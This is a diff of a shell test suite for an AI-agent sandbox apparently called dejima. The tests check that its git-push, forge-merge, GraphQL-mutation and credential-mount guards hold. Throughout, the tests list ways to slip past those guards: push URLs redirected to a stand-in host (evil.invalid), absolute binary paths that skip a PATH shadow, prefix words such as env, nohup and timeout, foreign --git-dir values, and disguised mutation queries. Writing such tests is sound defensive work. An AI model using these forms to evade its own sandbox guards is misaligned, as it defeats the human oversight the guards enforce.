 }
 
 @test "the git guard leaves everything that is not a blocked push alone" {
@@ -3819,6 +4716,20 @@ _guard_repo() {
     run _git_guard "$repo" -c remote.origin.pushurl=git@evil.invalid:o/r.git push origin feature
     [[ "$output" == *"may only push to"* ]] \
         || { echo "$output"; return 1; }
+
+    # --config-env is the same thing with the value read from the environment,
+    # in both spellings. The separated one also takes the next word, so an
+    # option this did not know would have left `remote.origin.pushurl=PUSHURL`
+    # to be read as the subcommand - and anything that is not `push` is a
+    # command the guard has nothing to say about.
+    PUSHURL=git@evil.invalid:o/r.git run _git_guard "$repo" \
+        --config-env remote.origin.pushurl=PUSHURL push origin feature
+    [[ "$output" == *"may only push to"* ]] \
+        || { echo "separated --config-env: $output"; return 1; }
+    PUSHURL=git@evil.invalid:o/r.git run _git_guard "$repo" \
+        --config-env=remote.origin.pushurl=PUSHURL push origin feature
+    [[ "$output" == *"may only push to"* ]] \
+        || { echo "attached --config-env: $output"; return 1; }
 }
 
 @test "the hook sees a push however git's own options are spelled" {
@@ -3832,18 +4743,33 @@ _guard_repo() {
     for cmd in "git --no-pager push origin main" \
                "git -c core.pager=cat push origin main" \
                "git --git-dir=$repo/.git push origin main" \
-               "ls && git push origin main"; do
+               "git --config-env http.extraHeader=HDR push origin main" \
+               "ls && git push origin main" \
+               "/usr/bin/git push origin main" \
+               "/opt/elsewhere/git push origin main"; do
         hook_out="$(printf '{"tool_input":{"command":"%s"},"cwd":"%s"}' "$cmd" "$repo" \
             | DEJIMA=1 DEJIMA_PUSH_HOSTS="forge.invalid" DEJIMA_BLOCKED_BRANCHES="main" \
               DEJIMA_FORGE_NAME=gitea bash "$REPO_ROOT/hooks/git-push-guard.sh" 2>&1 || true)"
         [[ "$hook_out" == *"Blocked by"* ]] \
             || { echo "not seen as a push: $cmd"; return 1; }
     done
-    # And a token that merely says push is not a git invocation.
-    hook_out="$(printf '{"tool_input":{"command":"echo push origin main"},"cwd":"%s"}' "$repo" \
-        | DEJIMA=1 DEJIMA_PUSH_HOSTS="forge.invalid" DEJIMA_BLOCKED_BRANCHES="main" \
-          DEJIMA_FORGE_NAME=gitea bash "$REPO_ROOT/hooks/git-push-guard.sh" 2>&1 || true)"
-    [ -z "$hook_out" ] || { echo "blocked something that is not a push: $hook_out"; return 1; }
+    # The path-qualified pair above is the form the library's header names as
+    # the reason both layers exist: the absolute path steps over the PATH
+    # shadow, so the hook is the only thing left that can see it. Comparing the
+    # whole first word meant it did not, and the same spelling was already
+    # fixed and tested for the forge CLI beside it.
+
+    # And a word that merely ends in git, or a token that merely says push, is
+    # not a git invocation - the basename above must not widen into a suffix
+    # match.
+    local cmd_ok
+    for cmd_ok in "echo push origin main" "mygit push origin main" \
+                  "git-annex push origin main"; do
+        hook_out="$(printf '{"tool_input":{"command":"%s"},"cwd":"%s"}' "$cmd_ok" "$repo" \
+            | DEJIMA=1 DEJIMA_PUSH_HOSTS="forge.invalid" DEJIMA_BLOCKED_BRANCHES="main" \
+              DEJIMA_FORGE_NAME=gitea bash "$REPO_ROOT/hooks/git-push-guard.sh" 2>&1 || true)"
+        [ -z "$hook_out" ] || { echo "blocked '$cmd_ok': $hook_out"; return 1; }
+    done
 }
 
 @test "both push guards refuse a remote they cannot resolve" {
@@ -3861,18 +4787,95 @@ _guard_repo() {
     [[ "$hook_out" == *"cannot resolve the remote"* ]] || { echo "hook: $hook_out"; return 1; }
 }
 
+@test "a push that writes more than one branch is checked for all of them" {
+    # Each of these resolved exactly one branch and checked that: --all and
+    # --mirror were opaque flags, and only the first positional after the
+    # remote was read. So `git push --all origin` from a feature branch pushed
+    # main, and `git push origin feature main` checked feature alone (#365).
+    local repo form hook_out
+    repo="$(_guard_repo)"
+    git -C "$repo" branch main
+
+    for form in "push --all origin" "push --mirror origin" \
+                "push origin feature main" "push origin main feature" \
+                "push origin feature refs/heads/x:refs/heads/main"; do
+        # shellcheck disable=SC2086
+        run _git_guard "$repo" $form
+        [[ "$output" == *"Blocked by dejima"* ]] \
+            || { echo "the shadow allowed 'git $form': $output"; return 1; }
+        hook_out="$(_push_hook "$repo" "git $form")"
+        [[ "$hook_out" == *"Blocked by"* ]] \
+            || { echo "the hook allowed 'git $form': $hook_out"; return 1; }
+    done
+
+    # --all with no protected branch in the checkout is an ordinary push. The
+    # refusal above has to come from the branch being there, or it is a guard
+    # that refuses the flag and proves nothing about the policy.
+    git -C "$repo" branch -D main
+    run _git_guard "$repo" push --all origin
+    [[ "$output" != *"Blocked by dejima"* ]] \
+        || { echo "--all refused with no protected branch present: $output"; return 1; }
+
+    # --mirror stays refused, because it also deletes the remote refs this
+    # checkout does not have - so a mirror from a repository with no main is
+    # exactly how the remote's main disappears.
+    run _git_guard "$repo" push --mirror origin
+    [[ "$output" == *"Blocked by dejima"* ]] || { echo "$output"; return 1; }
+}
+
+@test "a push that names its own repository is refused rather than checked against this one" {
+    # --git-dir and --work-tree were consumed and ignored, so the remote was
+    # resolved in the mounted project while git ran against a repository whose
+    # origin points somewhere else (#365). Honouring them would mean
+    # reimplementing how they combine with -C and with each other; refusing is
+    # the direction the unresolvable-remote case already takes.
+    local repo other form hook_out
+    repo="$(_guard_repo)"
+    other="$(mktemp -d "$BATS_TEST_TMPDIR/elsewhere.XXXXXX")"
+    git -C "$other" init -q -b main
+    git -C "$other" remote add origin git@evil.invalid:o/r.git
+
+    for form in "--git-dir $other/.git push origin main" \
+                "--git-dir=$other/.git push origin main" \
+                "--work-tree $other push origin main" \
+                "--work-tree=$other push origin main"; do
+        # shellcheck disable=SC2086
+        run _git_guard "$repo" $form
+        [[ "$output" == *"--git-dir or --work-tree"* ]] \
+            || { echo "the shadow allowed 'git $form': $output"; return 1; }
+        hook_out="$(_push_hook "$repo" "git $form")"
+        [[ "$hook_out" == *"--git-dir or --work-tree"* ]] \
+            || { echo "the hook allowed 'git $form': $hook_out"; return 1; }
+    done
+
+    # Not every git command: the refusal is about a push it cannot check, so
+    # anything else carrying the flag is left alone.
+    run _git_guard "$repo" --git-dir "$other/.git" status --short
+    [[ "$output" != *"Blocked by dejima"* ]] || { echo "$output"; return 1; }
+}
+
 @test "the two push guards agree on the same pushes" {
-    # Two implementations of one rule is the drift this repo warns about, so
-    # the overlap is pinned rather than assumed: for each case, the hook and
-    # the shadow reach the same verdict.
+    # Two implementations of one rule is the drift this repo warns about, and
+    # they had already drifted: the shadow skipped -o and read --repo, the hook
+    # did neither, so `git push -o x origin main` was fine to one and a hard
+    # refusal from the other. They now call the same function, and this is what
+    # says so for every form either one used to read differently (#365).
     local repo cmd hook_out guard_out hook_blocked guard_blocked
     repo="$(_guard_repo)"
-    for cmd in "git push origin main" "git push elsewhere" "git push origin feature"; do
-        # `|| true` because the hook signals a block by exiting 2, which would
-        # otherwise abort the test body before the comparison.
-        hook_out="$(printf '{"tool_input":{"command":"%s"},"cwd":"%s"}' "$cmd" "$repo" \
-            | DEJIMA=1 DEJIMA_PUSH_HOSTS="forge.invalid" DEJIMA_BLOCKED_BRANCHES="main" \
-              DEJIMA_FORGE_NAME=gitea bash "$REPO_ROOT/hooks/git-push-guard.sh" 2>&1 || true)"
+    git -C "$repo" branch main
+    for cmd in "git push origin main" "git push elsewhere" "git push origin feature" \
+               "git push" "git push origin" "git push origin HEAD" \
+               "git push -o ci.skip origin main" "git push --push-option=x origin main" \
+               "git push --repo origin main" "git push --repo=origin main" \
+               "git push origin +main" "git push --repo=origin elsewhere feature" \
+               "git push --receive-pack /bin/true origin main" \
+               "git push --all origin" "git push --mirror origin" \
+               "git push origin feature main" \
+               "git push --git-dir=/nowhere/.git origin main" \
+               "git -c remote.origin.pushurl=git@evil.invalid:o/r.git push origin feature" \
+               "git push nosuchremote feature" \
+               "git status --short" "git --git-dir=/nowhere/.git status"; do
+        hook_out="$(_push_hook "$repo" "$cmd")"
         # shellcheck disable=SC2086
         guard_out="$(_git_guard "$repo" ${cmd#git } || true)"
         hook_blocked=0; guard_blocked=0
@@ -3885,6 +4888,16 @@ _guard_repo() {
             return 1
         }
     done
+
+    # Agreement is worth nothing if it is agreement on allowing everything, so
+    # the list above has to contain both answers.
+    guard_blocked=0
+    for cmd in "push origin main" "push --all origin"; do
+        # shellcheck disable=SC2086
+        guard_out="$(_git_guard "$repo" $cmd || true)"
+        [[ "$guard_out" == *"Blocked by dejima"* ]] && guard_blocked=1
+    done
+    [ "$guard_blocked" -eq 1 ] || { echo "the agreed cases include no refusal"; return 1; }
 }
 
 # A refusal is three things, and the tests asserted one: the message. A guard
@@ -4030,14 +5043,95 @@ _repo_guard_shim() {
     # core stays forge-neutral.
     local d; d="$(mktemp -d "$BATS_TEST_TMPDIR/repopath.XXXXXX")"
     _repo_guard_shim "$d"
+    # A real newline, so the comment form below is the document a CLI would be
+    # handed rather than a backslash-n a test invented.
+    local NL=$'\n'
     local env_common=(DEJIMA=1 DEJIMA_FORGE_REAL_DIR="$d/real"
                       DEJIMA_FORGE_REPO=own/thing
                       DEJIMA_FORGE_REPO_PATHS="api:repos")
     local form
+    # The last one carries a brace, which is only an exemption for {owner} and
+    # {repo}: another repository's path is still that path with a placeholder
+    # in the query string.
     for form in "repos/other/thing/issues" "/repos/other/thing/issues" \
-                "repos/other/thing"; do
+                "repos/other/thing" "repos/other/thing/issues?per_page={n}"; do
         run env "${env_common[@]}" "$d/gh" api "$form"
         assert_forge_refused "Blocked by dejima" "gh api $form" || return 1
+    done
+
+    # An endpoint under no declared segment names no repository for this to
+    # compare, so there was nothing to refuse and nothing was - `gh api` then
+    # reached every endpoint the token did, with a write among them (#365).
+    # Under the declared subcommand the question is inverted: a target this can
+    # read has to be present.
+    # The brace exemption below is for {owner}/{repo} in an endpoint. A brace
+    # anywhere else - a field value, a --template - says nothing about which
+    # repository the call reaches, so it must not stand in for a target.
+    for form in "user/repos" "/orgs/someone/repos" "-X POST /user/repos" "rate_limit" \
+                "user/repos -f x={y}" "-X POST /orgs/someone/repos -f name={x}" \
+                "user --template {{.login}}"; do
+        # shellcheck disable=SC2086
+        run env "${env_common[@]}" "$d/gh" api $form
+        assert_forge_refused "names no endpoint under" "gh api $form" || return 1
+    done
+
+    # graphql is the one unscopable target that passes, because dejima's own
+    # github-pr reads review threads through it and the API has no other route
+    # to them. A query can only read, which the read-only token could do
+    # anyway. A mutation is what an agent reaches for once `gh pr merge`
+    # refuses, and no repository scoping can be read out of a GraphQL
+    # document, so that is refused however the document is spelled.
+    # Over every argument including the dash-prefixed ones, because a flag can
+    # carry its value attached: these put the document inside one word that the
+    # scoping loop skips, while positional `graphql` still looked scopable.
+    for form in "--field=query=mutation{mergePullRequest}" "-Fquery=mutation{mergePullRequest}" \
+                "--field=query=@doc.graphql" "-fquery=@doc.graphql" \
+                "--input" "--input=m.json"; do
+        run env "${env_common[@]}" "$d/gh" api graphql "$form"
+        assert_forge_refused "Blocked by dejima" "gh api graphql $form" || return 1
+    done
+    # --input takes the whole request body from a file, or from stdin with `-`,
+    # so the document is not in the command at any spelling - not as a field
+    # value this could read, and not as something the `=@` shape catches. The
+    # positional graphql beside it still counted as a readable target.
+    for form in "m.json" "-"; do
+        run env "${env_common[@]}" "$d/gh" api graphql --input "$form"
+        assert_forge_refused "takes its body from a file" "gh api graphql --input $form" \
+            || return 1
+    done
+    # Outside the declared subcommand it is a flag this has nothing to say
+    # about, or the refusal is about the word rather than about the body.
+    run env "${env_common[@]}" "$d/gh" issue create --input body.json
+    [[ "$output" == real:* ]] || { echo "--input was refused outside api: $output"; return 1; }
+    # A flag whose value is an ordinary header, which the same pass now sees
+    # and must have nothing to say about.
+    run env "${env_common[@]}" "$d/gh" api repos/own/thing/issues \
+        -H "Accept: application/vnd.github+json"
+    [[ "$output" == real:* ]] || { echo "a header was blocked: $output"; return 1; }
+
+    for form in "mutation{mergePullRequest(input:{pullRequestId:\"x\"}){clientMutationId}}" \
+                "mutation Merge { mergePullRequest }" \
+                "  mutation (\$id: ID!) { mergePullRequest }" \
+                "query A{x}mutation B{mergePullRequest(input:{x:1}){y}}" \
+                "query{x},mutation M{mergePullRequest}" \
+                "mutation,{mergePullRequest}" \
+                "mutation#why not${NL}{mergePullRequest}" \
+                "mutation"; do
+        run env "${env_common[@]}" "$d/gh" api graphql -f "query=$form"
+        assert_forge_refused "GraphQL mutation" "a mutation document" || return 1
+    done
+    # Both boundaries are anything that cannot continue an identifier, because
+    # each of these sits just outside a narrower one: a second operation puts
+    # `}` before the word, and GraphQL treats commas and comments as ignored
+    # tokens, so a comma or a `#` comment can stand between the word and the
+    # body. Which still has to leave a field merely NAMED for one alone, or the
+    # check costs an honest query.
+    for form in 'query($owner: String!) { repository(owner: $owner) { id } }' \
+                'query{foo_mutation}' 'query{fooMutation(x:1)}'; do
+        run env "${env_common[@]}" "$d/gh" api graphql -f "query=$form" \
+            -f owner=own -f name=thing
+        [[ "$output" == real:* ]] \
+            || { echo "a graphql query was blocked: $form -> $output"; return 1; }
     done
 
     # The launched-against repository goes through, and so do the two shapes
@@ -4051,7 +5145,7 @@ _repo_guard_shim() {
     #     that happens to look like an API path is not argv to compare.
     for form in "api repos/own/thing/issues" "api repos/{owner}/{repo}/issues" \
                 "issue create --title repos/other/thing" \
-                "api user/repos" "api graphql"; do
+                "api graphql"; do
         # shellcheck disable=SC2086
         run env "${env_common[@]}" "$d/gh" $form
         [[ "$output" == real:* ]] || { echo "'$form' was blocked: $output"; return 1; }
@@ -4108,7 +5202,7 @@ _repo_guard_shim() {
     # write is a POST to one endpoint with the verb in the query body, so it
     # matches no subcommand and needs no --method (#245).
     run grep -nEi '(gh (pr|issue) (create|edit|comment|merge|close|reopen))|-X (POST|PATCH|PUT|DELETE)|--method|\bmutation\b' "$tool"
-    [ "$status" -ne 0 ] || { echo "github-pr writes:"; echo "$output"; return 1; }
+    [ "$status" -eq 1 ] || { echo "github-pr writes:"; echo "$output"; return 1; }
 }
 
 # --- the authorship disclosure ----------------------------------------------
@@ -4412,24 +5506,33 @@ comment forge-cli issue comment"
     [ "$checked" -ge 6 ] || { echo "only checked $checked commands"; return 1; }
 }
 
-@test "the entrypoint links each guard only when it has something to enforce" {
+@test "the forge shadow is linked only when it has something to enforce; the git shadow always" {
     local e="$SANDBOX_DIR/entrypoint.sh"
     grep -q 'ln -sf /usr/local/lib/dejima/git-guard.sh /usr/local/bin/git' "$e" \
         || { echo "git is never shadowed"; return 1; }
     grep -q 'ln -sf /usr/local/lib/dejima/forge-guard.sh' "$e" \
         || { echo "the forge CLI is never shadowed"; return 1; }
-    # Both are conditional: a launch with no push hosts and no merge block
-    # should leave PATH as the image left it.
-    grep -q 'if \[ -n "${DEJIMA_PUSH_HOSTS:-}${DEJIMA_BLOCKED_BRANCHES:-}" \]' "$e" \
-        || { echo "the git shadow is unconditional"; return 1; }
+    # The git shadow is NOT conditional, and that reverses what this test used
+    # to require. Leaving PATH as the image left it is the right instinct for a
+    # shadow with nothing to enforce, and DEJIMA_PUSH_HOSTS is not that: it
+    # fails closed, so empty means every push is refused. Gating on it made the
+    # guard absent in precisely the case it exists for - and the shipped default
+    # workflow is local-only, which sets push off, so that was the ordinary
+    # launch. See the test named for it.
     # The shadow is linked for whatever the forge and workflow between them
     # ask for - a blocked merge, a body to disclose on, or both - and for
     # nothing when they ask for neither.
     grep -q 'if \[ -n "$_shadow_cli_list" \]' "$e" \
         || { echo "the forge shadow is unconditional"; return 1; }
-    grep -q 'DEJIMA_MERGE_BLOCK' "$e" \
+    # The set itself comes from the library, so that what the shadow is linked
+    # over and what hooks/merge-guard.sh checks a command against cannot
+    # disagree - which is the whole of #365 in one line.
+    grep -q 'dejima_forge_commands' "$e" \
+        || { echo "entrypoint derives the shadow set itself again"; return 1; }
+    local f="$SANDBOX_DIR/guard-lib.sh"
+    sed -n '/^dejima_forge_commands()/,/^}/p' "$f" | grep -q 'DEJIMA_MERGE_BLOCK' \
         || { echo "a blocked merge no longer reaches the shadow"; return 1; }
-    grep -q 'DEJIMA_DISCLOSE' "$e" \
+    sed -n '/^dejima_forge_commands()/,/^}/p' "$f" | grep -q 'DEJIMA_DISCLOSE' \
         || { echo "a disclosure no longer reaches the shadow"; return 1; }
     # And a merge_block naming a command the forge does not ship is refused
     # rather than looking enforced.
@@ -4444,8 +5547,15 @@ comment forge-cli issue comment"
     # Blocked in the sandbox, including path-qualified - /usr/local/bin is
     # where the image puts it, so a bare-name-only pattern would miss the
     # form an agent reaching past PATH would type.
+    #
+    # Including behind a prefix word. An absolute path to the real CLI steps
+    # over the PATH shadow, so if the hook only read the segment's first word
+    # that combination would have no layer looking at it.
     local cmd
-    for cmd in 'gitea-pr merge 24' '/usr/local/bin/gitea-pr merge 24' 'cd /tmp && gitea-pr merge 24'; do
+    for cmd in 'gitea-pr merge 24' '/usr/local/bin/gitea-pr merge 24' 'cd /tmp && gitea-pr merge 24' \
+               'env /usr/local/lib/dejima/forge/gitea-pr merge 24' \
+               'nohup /usr/local/lib/dejima/forge/gitea-pr merge 24' \
+               'timeout 5 /usr/local/lib/dejima/forge/gitea-pr merge 24'; do
         payload=$(jq -n --arg c "$cmd" '{tool_input: {command: $c}}')
         run bash -c "printf '%s' \"\$1\" | DEJIMA=1 DEJIMA_MERGE_BLOCK='gitea-pr merge' bash '$hook'" _ "$payload"
         [ "$status" -eq 2 ]
@@ -4761,19 +5871,54 @@ registered_commands() {
         || { echo "the reachability check is not retried"; return 1; }
 
     # The negatives: not.
-    local line
+    local line seen=0
     while IFS= read -r line; do
+        seen=$((seen + 1))
         case "$line" in
             *retry_positive*) echo "a negative control is retried: $line"; return 1 ;;
         esac
     done < <(grep -E 'verify_refused|verify_port_refused|verify_ipv6_refused|PROBE_NAME\)' <<< "$v")
+    # Counted, because a loop over nothing passes: renaming those helpers would
+    # leave this asserting that none of zero lines retries.
+    [ "$seen" -ge 3 ] \
+        || { echo "found $seen negative controls in verify(), so this checked almost nothing"; return 1; }
 
-    # And the lookup has to report emptiness, or retrying it is a no-op: it
-    # returns 0 whether or not it found an address otherwise.
-    local r
-    r=$(sed -n '/^resolve_one()/,/^}/p' "$p")
-    [ "$(grep -c 'return 1' <<< "$r")" -ge 1 ] \
-        || { echo "resolve_one cannot signal 'no address', so retrying it does nothing"; return 1; }
+    # And the lookup has to report BOTH ways of having no address, or retrying
+    # it is a no-op for one of them. Driven rather than grepped: `return 1`
+    # appears in that function for the empty-answer case, so its presence was
+    # satisfied while a failing dig still returned 0 (#345).
+    local case_name
+    for case_name in failed empty; do
+        run bash -c '
+            set -u
+            d="$2/digstub"; mkdir -p "$d"
+            if [ "$3" = failed ]; then
+                printf "#!/bin/bash\nexit 9\n" > "$d/dig"
+            else
+                printf "#!/bin/bash\nexit 0\n" > "$d/dig"
+            fi
+            chmod +x "$d/dig"
+            PATH="$d:$PATH"
+            eval "$(sed -n "/^resolve_one()/,/^}/p" "$1")"
+            resolve_one some.example
+        ' _ "$p" "$BATS_TEST_TMPDIR" "$case_name"
+        [ "$status" -ne 0 ] \
+            || { echo "resolve_one reported success for a $case_name lookup, so retrying it does nothing"; return 1; }
+    done
+
+    # And it still succeeds when there IS an address, or the retry would spin
+    # on every name and the boot would fail on all of them.
+    run bash -c '
+        set -u
+        d="$2/digok"; mkdir -p "$d"
+        printf "#!/bin/bash\necho 192.0.2.7\n" > "$d/dig"
+        chmod +x "$d/dig"
+        PATH="$d:$PATH"
+        eval "$(sed -n "/^resolve_one()/,/^}/p" "$1")"
+        resolve_one some.example
+    ' _ "$p" "$BATS_TEST_TMPDIR"
+    [ "$status" -eq 0 ] || { echo "resolve_one failed on a good answer: $output"; return 1; }
+    [ "$output" = 192.0.2.7 ] || { echo "resolve_one did not print the address: $output"; return 1; }
 }
 
 @test "a retried check reports the status the command actually returned" {
@@ -5056,7 +6201,7 @@ registered_commands() {
     [ ! -e "$REPO_ROOT/config/env" ]
     [ ! -e "$REPO_ROOT/bin/dejima-env.sh" ]
     run grep -n 'config/env\|dejima-env' "$REPO_ROOT/bin/dejima"
-    [ "$status" -ne 0 ]
+    [ "$status" -eq 1 ]
     grep -q 'ALLOWED_DOMAINS="$(approved_entries "$(config_root)" allowed-domains' "$REPO_ROOT/bin/dejima"
 }
 
@@ -5205,7 +6350,7 @@ registered_commands() {
     # container would otherwise not have, not a mask over the operator's.
     grep -q 'extra_mounts+=(-v "\$SANDBOX_CREDENTIAL_PROXY_DIR:\$SANDBOX_CREDENTIAL_PROXY_DIR:ro")' "$REPO_ROOT/bin/dejima"
     run grep -n 'CREDENTIALS_MASK_FILE\|CREDENTIALS_TMPDIR_MASK\|dejima-credentials-mask\|dejima-credentials-tmpdir-mask' "$REPO_ROOT/bin/dejima"
-    [ "$status" -ne 0 ]
+    [ "$status" -eq 1 ]
 }
 
 @test "the proxy's log lives outside the directory the session mounts" {
@@ -5229,11 +6374,26 @@ registered_commands() {
     # proxy-disabled branch.
     run grep -c 'extra_mounts+=(-v "\$HOME/\.claude/\.credentials\.json:\$HOME/\.claude/\.credentials\.json")' "$REPO_ROOT/bin/dejima"
     [ "$output" = "1" ]
-    local mount_line branch_line
-    mount_line=$(grep -n 'extra_mounts+=(-v "\$HOME/\.claude/\.credentials\.json' "$REPO_ROOT/bin/dejima" | cut -d: -f1)
-    branch_line=$(grep -n 'elif \[ -f "\$HOME/\.claude/\.credentials\.json" \]; then' "$REPO_ROOT/bin/dejima" | cut -d: -f1)
-    [ -n "$branch_line" ]
-    [ "$branch_line" -lt "$mount_line" ]
+    # And the branch it sits under names every condition that makes this the
+    # documented downgrade rather than a credential handed to a session with
+    # no use for it. It was `elif [ -f <that file> ]`, which fired for
+    # anything the proxy branch did not take - including a backend needing no
+    # credential at all, the arrangement docs/security.md calls the one with
+    # nothing in the container to steal.
+    local flat branch
+    flat="$(sed -z 's/\\\n[[:space:]]*/ /g' "$REPO_ROOT/bin/dejima")"
+    branch="$(grep -E '^elif .*credentials\.json' <<< "$flat")"
+    [ -n "$branch" ] || { echo "the mount is not under an elif that tests it"; return 1; }
+    local need
+    for need in '! backend_proxy_enabled' 'DEJIMA_BACKEND_CREDENTIAL_KIND" != none' \
+                'DEJIMA_BACKEND_CREDENTIAL_FILE' '-n "$DEJIMA_BACKEND_NAME"'; do
+        grep -qF -- "$need" <<< "$branch" \
+            || { echo "the credential mount's branch does not test: $need"; return 1; }
+    done
+    # The file comparison is what makes it THIS backend's credential rather
+    # than any backend with the proxy off.
+    grep -qF -- 'readlink -m "$DEJIMA_BACKEND_CREDENTIAL_FILE"' <<< "$branch" \
+        || { echo "the branch does not compare the backend's own credential file"; return 1; }
 }
 
 @test "the container gets an empty credentials file of its own" {
@@ -5410,9 +6570,9 @@ sandbox_context() {
     # --global persists to the host-side approval store now (Task 3); the old
     # sed -i rewrite of config/env's ALLOWED_DOMAINS is gone for good.
     run grep -F 'config/env' "$REPO_ROOT/bin/dejima-allow"
-    [ "$status" -ne 0 ]
+    [ "$status" -eq 1 ]
     run grep -F 'sed -i' "$REPO_ROOT/bin/dejima-allow"
-    [ "$status" -ne 0 ]
+    [ "$status" -eq 1 ]
 }
 
 @test "bin/dejima scans only the mounted ~/.claude dirs for symlink targets" {
@@ -5460,7 +6620,7 @@ sandbox_context() {
     # hardcoded per filename.
     grep -q 'install -o root -g root -m 555' "$SANDBOX_DIR/entrypoint.sh"
     run grep -F 'extra_mounts+=(-v "$HOME/.claude/statusline.sh:$HOME/.claude/statusline.sh' "$REPO_ROOT/bin/dejima"
-    [ "$status" -ne 0 ]
+    [ "$status" -eq 1 ]
 }
 
 @test "bin/dejima refuses to launch rather than silently skip a dangling statusline.sh symlink" {
@@ -5479,7 +6639,7 @@ sandbox_context() {
     grep -q 'if \[ -L "\$_ssrc" \] && \[ ! -e "\$_ssrc" \]' "$REPO_ROOT/bin/dejima"
     grep -q "Docker can't bind-mount a dangling symlink" "$REPO_ROOT/bin/dejima"
     run grep -n '\[ -e "\$HOME/\.claude/\$f" \]' "$REPO_ROOT/bin/harness/claude-code.sh"
-    [ "$status" -ne 0 ] || { echo "the plugin filters on existence, hiding a dangling symlink"; return 1; }
+    [ "$status" -eq 1 ] || { echo "the plugin filters on existence, hiding a dangling symlink"; return 1; }
 }
 
 @test "bin/dejima-audit monitors the home-level ~/.claude/statusline.sh (Finding 1 compensating control)" {
@@ -5573,7 +6733,7 @@ this line is not json'
     n=$(grep -cE '^(container|network)_name\(\).*BATS_RUN_TMPDIR' "$rt")
     [ "$n" -eq 2 ] || { echo "expected 2 helpers keyed on BATS_RUN_TMPDIR, found $n"; return 1; }
     run grep -nE '^(container|network)_name\(\).*BATS_FILE_TMPDIR' "$rt"
-    [ "$status" -ne 0 ] || {
+    [ "$status" -eq 1 ] || {
         echo "a name helper is back on BATS_FILE_TMPDIR, whose basename is always 0:" >&2
         echo "$output" >&2
         return 1
@@ -5740,7 +6900,7 @@ STUB
     # an open namespace, passing egress tests for the wrong reason.
     grep -qF "pgrep -x -f 'sleep infinity'" "$REPO_ROOT/test/runtime.bats"
     run grep -nE 'docker exec.*pgrep -x sleep' "$REPO_ROOT/test/runtime.bats"
-    [ "$status" -ne 0 ]
+    [ "$status" -eq 1 ]
 }
 
 @test "dejima-allow has no env-triggered path that skips the live session" {
@@ -5753,7 +6913,7 @@ STUB
     # still name it in a comment explaining why it is gone, and a grep that
     # tripped on its own rationale would have to be deleted to pass.
     run grep -n '\${\?DEJIMA_ALLOW_SKIP_SESSION' "$REPO_ROOT/bin/dejima-allow"
-    [ "$status" -ne 0 ]
+    [ "$status" -eq 1 ]
     run grep -rn --exclude=static.bats 'DEJIMA_ALLOW_SKIP_SESSION=' \
         "$REPO_ROOT/test" "$REPO_ROOT/README.md"
     [ "$status" -ne 0 ]
@@ -5774,7 +6934,7 @@ STUB
     # read by the reporting/approval path, never by the launcher deciding
     # what to allow.
     run grep -n '\.dejima/' "$REPO_ROOT/bin/dejima"
-    [ "$status" -ne 0 ]
+    [ "$status" -eq 1 ]
 }
 
 @test "docker-compose.yml image honors SANDBOX_IMAGE with today's default" {
@@ -5843,7 +7003,7 @@ STUB
     # A root-context build with the untrusted project as context would let a
     # session's own files influence the image it then runs in.
     run grep -n 'docker build.*"\$WORKSPACE_DIR"' "$REPO_ROOT/bin/dejima"
-    [ "$status" -ne 0 ]
+    [ "$status" -eq 1 ]
     grep -q 'SANDBOX_DERIVED_CONTEXT' "$REPO_ROOT/bin/dejima"
 }
 
@@ -5894,7 +7054,7 @@ STUB
     local cap
     for cap in SYS_ADMIN MKNOD SETFCAP SYS_CHROOT SYS_PTRACE; do
         run grep -nE "^\s*- $cap\s*$" "$c"
-        [ "$status" -ne 0 ] || { echo "$cap is declared and nothing uses it"; return 1; }
+        [ "$status" -eq 1 ] || { echo "$cap is declared and nothing uses it"; return 1; }
     done
 }
 
@@ -5916,7 +7076,7 @@ STUB
     local c="$SANDBOX_DIR/docker-compose.yml" cap
     for cap in NET_ADMIN NET_RAW; do
         run grep -nE "^\s*- $cap\s*$" "$c"
-        [ "$status" -ne 0 ] \
+        [ "$status" -eq 1 ] \
             || { echo "the session container declares $cap, so it can reach the filter"; return 1; }
         grep -q -- "--cap-add $cap" "$REPO_ROOT/bin/dejima" \
             || { echo "$cap left the session container without arriving at the filter"; return 1; }
@@ -5932,7 +7092,7 @@ STUB
     # The same split for the one sysctl: a property of a namespace the session
     # container does not own, so it is set by the container that does.
     run grep -nE '^\s*sysctls:' "$c"
-    [ "$status" -ne 0 ] \
+    [ "$status" -eq 1 ] \
         || { echo "the session container declares a sysctl for a namespace it does not own"; return 1; }
     grep -q -- '--sysctl net.ipv4.ip_unprivileged_port_start=0' "$REPO_ROOT/bin/dejima" \
         || { echo "nothing sets the unprivileged port floor the TLS terminator needs"; return 1; }
@@ -5969,7 +7129,7 @@ STUB
         || { echo "a container in the pair runs without no-new-privileges"; return 1; }
 
     run grep -nE -- '--cap-add=(NET_ADMIN|NET_RAW|CHOWN|SETUID)' <<< "$pair"
-    [ "$status" -ne 0 ] \
+    [ "$status" -eq 1 ] \
         || { echo "a capability is hardcoded in the pair:"; echo "$output"; return 1; }
 
     # And the fixture that stands in for a session goes through it, or the
@@ -6007,7 +7167,7 @@ STUB
         "$SANDBOX_DIR/docker-compose.yml"
     [ "$status" -ne 0 ]
     run grep -nE '^\s*extra_mounts\+=.*(PROJECT_STORE|config_root)' "$REPO_ROOT/bin/dejima"
-    [ "$status" -ne 0 ]
+    [ "$status" -eq 1 ]
     # Both greps are literal, so neither can see a mount whose path is
     # computed at run time - and two of those reached the store (#15): a
     # [mounts] readonly entry naming it, and a ~/.claude symlink pointing
@@ -6032,7 +7192,7 @@ STUB
     # could plainly reach. What is left to pin is that it does not go back to
     # reading a file it has no access to.
     run grep -n 'dnsmasq\|servers.conf\|/run/egress-policy' "$REPO_ROOT/hooks/dejima-briefing-render.sh"
-    [ "$status" -ne 0 ] \
+    [ "$status" -eq 1 ] \
         || { echo "the probe reads the filter container's files again:"; echo "$output"; return 1; }
     grep -q 'dig +short' "$REPO_ROOT/hooks/dejima-briefing-render.sh" \
         || { echo "nothing asks the resolver whether a declared domain is permitted"; return 1; }
@@ -6111,7 +7271,7 @@ STUB
 @test "the base image ships none of the packages used as dependency fixtures" {
     for pkg in $(grep -oE "apt:[a-z0-9.+-]+" "$REPO_ROOT/test/runtime.bats" | cut -d: -f2 | sort -u); do
         run grep -nE "^ +$pkg \\\\$" "$SANDBOX_DIR/Dockerfile"
-        [ "$status" -ne 0 ] || {
+        [ "$status" -eq 1 ] || {
             echo "$pkg is a dependency-test fixture and is also in the base image" >&2
             false
         }
@@ -6183,7 +7343,7 @@ STUB
     # The context must not travel as a single argv element even so - staying
     # just inside a limit is not the same as not having one.
     run grep -n 'jq -n --arg context' "$REPO_ROOT/hooks/sandbox-context.sh"
